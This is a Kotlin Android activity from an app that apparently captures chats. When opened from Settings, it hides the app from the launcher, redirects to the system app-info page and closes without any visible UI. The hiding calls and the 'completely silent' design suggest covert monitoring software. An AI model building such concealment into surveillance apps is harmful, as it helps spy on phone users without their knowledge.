package com.chats.capture.ui

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager
import timber.log.Timber

/**
 * Activity accessible from Android Settings
 * Redirects to system app info page where users can manage permissions
 * App should be completely silent - no UI shown
 */
class SettingsShortcutActivity : AppCompatActivity() {
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        Timber.d("SettingsShortcutActivity opened from Settings")
        
        // Ensure app stays hidden from launcher
        AppHider.ensureHidden(this)
        AppVisibilityManager.hideFromLauncher(this)
        
        // Redirect to system app info page where users can manage permissions
        // This allows users to access: Settings -> Apps -> Chat Capture -> Permissions
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.fromParts("package", packageName, null)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        } catch (e: Exception) {
            Timber.e(e, "Error opening app settings")
        }
        
        // Finish immediately - no UI should be shown
        finish()
    }
}
